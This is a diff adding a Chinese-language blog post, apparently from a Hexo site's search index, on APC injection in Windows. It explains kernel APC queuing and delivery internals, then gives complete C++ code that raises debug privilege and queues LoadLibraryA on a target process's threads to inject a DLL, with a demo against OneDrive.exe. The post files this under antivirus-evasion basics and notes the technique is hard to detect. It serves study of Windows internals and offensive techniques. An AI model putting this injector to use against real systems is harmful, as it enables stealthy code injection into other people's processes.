@@ -101,4 +101,73 @@
         <tag>免杀</tag>
       </tags>
   </entry>
+  <entry>
+    <title>APC注入</title>
+    <url>/2023/09/12/APC%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>APC即异步过程调用，是指函数在特定线程中被异步执行，在操作系统中，APC是一种并发机制。由于线程是不能被杀掉，挂起，恢复的，线程在执行时会占据CPU，而APC注入可以改变一个线程的行为，可用于DLL注入。</p>
+<span id="more"></span>
+
+<h1 id="一、APC机制"><a href="#一、APC机制" class="headerlink" title="一、APC机制"></a>一、APC机制</h1><h2 id="1-1APC调用的条件"><a href="#1-1APC调用的条件" class="headerlink" title="1.1APC调用的条件"></a>1.1APC调用的条件</h2><p>​		往线程APC队列添加APC，系统会产生一个软中断。在线程下一次被调度的时候，就会执行APC函数，APC有两种形式，由系统产生的APC称为内核模式APC，由应用程序产生的APC被称为用户模式APC。这里介绍一下应用程序的APC，APC是往线程中插入一个回调函数,但是用的APC调用这个回调函数是有条</p>
+<p>件的。</p>
+<p>​		当用户模式 APC 排队时，它排队的线程不会被定向到调用 APC 函数，除非它处于可警告状态。线程在调用SleepEx、SignalObjectAndWait，MsgWaitForMultipleObjectsEx、WaitForMultipleObjectsEx或WaitForSingleObjectEx函数时进入可警告状态。如果在 APC 排队之前等待满足，则线程不再处于可警告等待状态，因此不会执行 APC 函数。但是，APC 仍在排队，因此当线程调用另一个可警告的等待函数时，APC 函数将被执行。</p>
+<h2 id="1-2QueueUserAPC函数"><a href="#1-2QueueUserAPC函数" class="headerlink" title="1.2QueueUserAPC函数"></a>1.2QueueUserAPC函数</h2><p>QueueUserAPC用于添加制定的异步函数调用(回调函数)到执行的线程的APC队列中。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DWORD QueueUserAPC( PAPCFUNCpfnAPC, // APC function,执行函数地址</span><br><span class="line">					HANDLEhThread, // handle to thread，插入APC的线程句柄，句柄必须包含THREAD_SET_CONTEXT 访问权限。</span><br><span class="line">                    ULONG_PTRdwData // APC function parameter，第三个参数表示传递给执行函数的参数</span><br><span class="line">                    );</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-3APC队列"><a href="#1-3APC队列" class="headerlink" title="1.3APC队列"></a>1.3APC队列</h2><p>APC是针对具体线程，由具体线程加以执行的，所以每个线程都有自己的APC队列。内核中代表着线程的数据结构是ETHREAD，而ETHREAD中的第一个成分Tcb 是KTHREAD数据结构，线程的APC队列就在KTHREAD里面。</p>
+<p>KTHREAD + 0x34 处是一个 _KAPC_STATE 结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">...</span><br><span class="line">+0x034 ApcState         : _KAPC_STATE</span><br></pre></td></tr></table></figure>
+
+<p>_KAPC_STATE的结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KAPC_STATE </span><br><span class="line">nt!_KAPC_STATE </span><br><span class="line">+0x000 ApcListHead //2个APC队列 用户APC和内核APC</span><br><span class="line">+0x010 Process //线程所属或者所挂靠的进程</span><br><span class="line">+0x014 KernelApcInProgress //内核APC是否正在执行</span><br><span class="line">+0x015 KernelApcPending //是否有正在等待执行的内核APC</span><br><span class="line">+0x016 UserApcPending //是否有正在等待执行的用户APC</span><br><span class="line"></span><br><span class="line">用户APC：APC函数地址位于用户空间，在用户空间执行</span><br><span class="line"></span><br><span class="line">内核APC：APC函数地址位于内核空间，在内核空间执行（分为NormalRoutine为NULL的SpecialKernelApc和不为NULL的NormalKernelApc。SpecialKernelApc只执行KernelRoutine，IRQL为APC_LEVEL，而NormalKernelApc不仅仅执行 KernelRoutine还执行NormalRoutine，在PASSIVE_LEVEL下执行NormalRoutine。）</span><br></pre></td></tr></table></figure>
+
+<p>NormalRoutine 会找到你提供的APC函数，并不完全等于APC函数的地址。</p>
+<h2 id="1-4APC函数执行流程"><a href="#1-4APC函数执行流程" class="headerlink" title="1.4APC函数执行流程"></a>1.4APC函数执行流程</h2><h3 id="1-4-1相关函数"><a href="#1-4-1相关函数" class="headerlink" title="1.4.1相关函数"></a>1.4.1相关函数</h3><p>KiServiceExit函数：这个函数是系统调用、异常或中断返回用户空间的必经之路。</p>
+<p>KiDeliverApc函数：负责执行APC函数</p>
+<h3 id="1-4-2QueueUserApc"><a href="#1-4-2QueueUserApc" class="headerlink" title="1.4.2QueueUserApc"></a>1.4.2QueueUserApc</h3><p>(1)通过3环的QueueUserApc函数可以完成将APC插入到队列的操作，首先调用了 ntdll.dll 的 NtQueueApcThread。</p>
+<p>(2)然后通过 0xB4 的调用号进入ring0。在windbg里面对应的内核函数为 NtQueueApcThread。</p>
+<p>(3)然后在 ntosknl.exe 里面定位到 NtQueueApcThread.</p>
+<p>(4)最后是调用 KeInitializeApc(对KAPC结构体进行初始化) 和 KeInsertQueueApc 这两个函数来实现APC的效果。</p>
+<h3 id="1-4-3用户APC"><a href="#1-4-3用户APC" class="headerlink" title="1.4.3用户APC"></a>1.4.3用户APC</h3><p>当产生系统调用、中断或者异常，线程在返回用户空间前都会调用 KiServiceExit 函数，在KiServiceExit 会判断是否有要执行的用户APC，如果有则调用KiDeliverApc 函数(第一个参数为1)进行处理。涉及的换栈操作如下：</p>
+<p>（1）当线程从用户层进入内核层时，要保留原来的运行环境，比如各种寄存器，栈的位置等等( _Trap_Frame )，然后切换成内核的堆栈，如果正常返回，恢复堆栈环境即可。用来保存原始环境的数据结构为SavedApcState。</p>
+<p>（2）但如果有用户APC要执行的话，就意味着线程要提前返回到用户空间去执行，而且返回的位置不是线程进入内核时的位置，而是返回到其他的位置，每处理一个用户APC都会涉及到：内核–&gt;用户空间–&gt;再回到内核空间。</p>
+<p>线程进0环时，原来的运行环境(寄存器栈顶等)保存到 _Trap_Frame 结构体中，如果要提前返回3环去处理用户APC，就必须要修改 _Trap_Frame 结构体。处理完APC后该如何返回原来的位置？</p>
+<p>KiInitializeUserApc 要做的第一件事就是备份，将原来 _Trap_Frame 的值备份到一个新的结构体中( CONTEXT )，这个功能由其子函数KeContextFromKframes 来完成。具体操作如下:</p>
+<p>1.首先判断参数是否为1，当参数为1的时候处理用户APC。再判断Apcstate.UserApcPending是否为1，为1则有用户APC要执行。</p>
+<p>2.将ApcState.UserApcPending设置为0.</p>
+<p>3.链表操作，将当前APC从用户队列中移除。</p>
+<p>4.调用函数(KAPC.KernelRoutine)释放KAPC结构内存空间</p>
+<p>5.转到 KiInitializeUserApc 函数，将 CONTEXT 和 TrapFrame 传入 KeContextFromKframes</p>
+<p>6.当windows把 CONTEXT 结构复制到堆栈之后，准备用户层执行环境，首先修改SS、DS、ES、FS、GS和EFLAGS寄存器</p>
+<p>7.然后修改esp到3环堆栈</p>
+<p>8.然后修改eip，这里永远返回一个固定的位置，但是这个位置在每次系统启动的时候都不相同，存放在3环的 ntdll 里的 KiUserApcDispatcher 参数里面</p>
+<p>9.然后到ntdll里面定位到 KiUserApcDispatcher ，首先得到指向 CONTEXT 结构的指针，然后 pop eax 得 到 NormalRoutine 结构，这里当APC是内核APC的时候存储的是真正的APC地址，当APC是用户APC的时候存储的是指向用户APC的总入口。当我们调用 QueueUserAPC ，并没有指定 NormalRoutine 结构，只指定了 NormalContext 和 SystemArgument1 ，那么这个参数在 QueueUserAPC 内部指定，在 kernel32.dll 的 BaseDispatchAPC ，用来调用真正的用户APC函数。</p>
+<p>10.调用ZwContinue 。</p>
+<p>（1）返回内核，如果还有用户APC，重复上面的执行过程。 </p>
+<p>（2）如果没有需要执行的用户APC，会将CONTEXT赋值给Trap_Frame结构体。就像从来没有修改过一样。 ZwContinue后面的代码不会执行，线程从哪里进0环仍然会从哪里回去。</p>
+<p>11.使用 0x20 的调用号利用调用门回到0环。</p>
+<h1 id="二、apc注入"><a href="#二、apc注入" class="headerlink" title="二、apc注入"></a>二、apc注入</h1><h2 id="2-1步骤"><a href="#2-1步骤" class="headerlink" title="2.1步骤"></a>2.1步骤</h2><p>1.当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。</p>
+<p>2.当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。</p>
+<p>3.利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。</p>
+<p>在整个执行过程中，线程并无任何异常举动，不容易被察觉，但缺点是对于单线程程序一般不存在挂起状态，所以APC注入对于这类程序没有明显效果。</p>
+<h2 id="2-2流程"><a href="#2-2流程" class="headerlink" title="2.2流程"></a>2.2流程</h2><p>1.OpenProcess 打开进程</p>
+<p>2.VirtualAlloc 申请空间</p>
+<p>3.WriteProcessMemory 写入dll信息</p>
+<p>4.根据进程对应的线程id打开线程</p>
+<p>5.使用 QueueUserApc 插入执行</p>
+<h2 id="2-3代码实现"><a href="#2-3代码实现" class="headerlink" title="2.3代码实现"></a>2.3代码实现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;TlHelp32.h&gt;</span><br><span class="line">#include&lt;tchar.h&gt;</span><br><span class="line"></span><br><span class="line">//提权函数</span><br><span class="line">BOOL EnableDebugPrivilege() &#123;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	BOOL fok = FALSE;</span><br><span class="line">	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123;</span><br><span class="line">		TOKEN_PRIVILEGES tp;</span><br><span class="line">		tp.PrivilegeCount = 1;</span><br><span class="line">		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);</span><br><span class="line">		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);</span><br><span class="line">		fok = (GetLastError() == ERROR_SUCCESS);</span><br><span class="line">		CloseHandle(hToken);</span><br><span class="line">	&#125;</span><br><span class="line">	return fok;</span><br><span class="line">&#125;</span><br><span class="line">BOOL APCInjectDLL(DWORD dwPid, char* pszDllName) &#123;</span><br><span class="line">	EnableDebugPrivilege(); </span><br><span class="line">	//打开进程,获取进程句柄</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">	if (hProcess == NULL) &#123; return FALSE; &#125;</span><br><span class="line">	//向目标进程申请空间写入dll全路径 </span><br><span class="line">	int nSize = strlen(pszDllName);</span><br><span class="line">	LPVOID pDllAddr = VirtualAllocEx(hProcess, NULL, nSize, MEM_COMMIT, PAGE_READWRITE); </span><br><span class="line">	SIZE_T dwWrittenSize = 0; </span><br><span class="line">	WriteProcessMemory(hProcess, pDllAddr, pszDllName, nSize, &amp;dwWrittenSize); </span><br><span class="line">	//获取LoadLibraryA的地址</span><br><span class="line">	HMODULE hMod = GetModuleHandleA(&quot;kernel32.dll&quot;);</span><br><span class="line">	FARPROC pFuncAddr = GetProcAddress(hMod, &quot;LoadLibraryA&quot;); </span><br><span class="line">	//创建线程快照</span><br><span class="line">	THREADENTRY32 te = &#123; 0 &#125;; </span><br><span class="line">	te.dwSize = sizeof(te);</span><br><span class="line">	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);</span><br><span class="line">	if (hSnap == INVALID_HANDLE_VALUE) &#123; return FALSE; &#125;</span><br><span class="line">	DWORD dwRet = 0;</span><br><span class="line">	HANDLE hThread = NULL; </span><br><span class="line">	if (Thread32First(hSnap, &amp;te)) &#123; </span><br><span class="line">		do &#123;</span><br><span class="line">			if (te.th32OwnerProcessID == dwPid) &#123;</span><br><span class="line">				hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line">				if (hThread) &#123;</span><br><span class="line">					dwRet = QueueUserAPC((PAPCFUNC)pFuncAddr, hThread, (ULONG_PTR)pDllAddr);</span><br><span class="line">					hThread = NULL;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; while (Thread32Next(hSnap, &amp;te));</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess); </span><br><span class="line">	CloseHandle(hSnap); </span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;int main(int argc, char* argv[]) &#123; </span><br><span class="line">	if (argc == 3) &#123; </span><br><span class="line">		if (FALSE == APCInjectDLL((DWORD)_tstol(argv[1]), argv[2])) </span><br><span class="line">			printf(&quot;APCInject failed\n&quot;); else</span><br><span class="line">			printf(&quot;APCInject successfully\n&quot;); </span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		printf(&quot;\nUsage: %s &lt;PID&gt; &lt;Dllpath&gt;\n&quot;);</span><br><span class="line">		printf(&quot;Example: %s 520 C:\\test.dll\n&quot;); </span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将程序和要注入的dll放入虚拟机。在cmd中使用tasklist命令查看进程id。</p>
+<p><img src="/images/APC%E6%B3%A8%E5%85%A5/image-20230912111408508.png" alt="image-20230912111408508"></p>
+<p>找到一个OneDrive.exe,PID为5776</p>
+<p>输入命令注入，结果如图：</p>
+<p><img src="/images/APC%E6%B3%A8%E5%85%A5/image-20230912111646582.png" alt="image-20230912111646582"></p>
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>本篇简单介绍了apc注入的基本概念和流程，如果有哪里讲述不对的地还望各位大佬赐教。</p>
+]]></content>
+      <categories>
+        <category>免杀基础</category>
+      </categories>
+      <tags>
+        <tag>免杀</tag>
+      </tags>
+  </entry>
 </search>
